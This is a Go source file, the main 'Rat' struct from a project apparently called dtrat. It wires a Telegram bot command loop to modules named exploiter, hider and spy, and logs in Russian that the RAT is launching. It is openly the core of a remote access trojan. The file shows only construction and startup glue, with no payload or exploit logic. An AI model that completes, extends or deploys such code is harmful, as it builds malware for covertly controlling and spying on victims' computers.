package rat

import (
	"dtrat/bot"
	"dtrat/config"
	"dtrat/engine"
	"dtrat/exploiter"
	"dtrat/hider"
	"dtrat/spy"
	"errors"
	"fmt"

	"github.com/deuterium34/dlog"
)

type Rat struct {
	bot       *bot.Tgbot
	engine    *engine.Engine
	exploiter *exploiter.Exploiter
	hider     *hider.Hider
	spy       *spy.Spy

	config  config.Config
	CloseCh chan (error)
}

var (
	ErrClosed = errors.New("Closed")
)

func NewRat() (*Rat, error) {
	cfg, err := config.NewConfig("config.toml")
	if err != nil {
		return nil, fmt.Errorf("NewConfig: %w", err)
	}

	bot, err := bot.NewBot(cfg)
	if err != nil {
		return nil, fmt.Errorf("NewBot: %w", err)
	}

	eng, err := engine.NewEngine(cfg)
	if err != nil {
		return nil, fmt.Errorf("NewEngine: %w", err)
	}

	exp, err := exploiter.NewExploiter()
	if err != nil {
		return nil, fmt.Errorf("NewExploiter: %w", err)
	}

	hdr, err := hider.NewHider()
	if err != nil {
		return nil, fmt.Errorf("NewHider: %w", err)
	}

	spy, err := spy.NewSpy()
	if err != nil {
		return nil, fmt.Errorf("NewSpy: %w", err)
	}

	rat := Rat{
		bot:       bot,
		engine:    eng,
		exploiter: exp,
		hider:     hdr,
		spy:       spy,
		config:    cfg,
		CloseCh:   make(chan error, 1),
	}

	return &rat, nil
}

func (r *Rat) internalClose(reason error) {
	r.bot.Close()
	r.engine.Close()
	r.spy.Close()

	r.CloseCh <- reason
}

func (r *Rat) Close() {
	r.internalClose(ErrClosed)
}

func (r *Rat) Start() {
	dlog.GLogger.Info("Запуск ратника")
	go r.bot.CommandsHandligLoop(r.engine)
	go r.bot.WakeNotification()
}
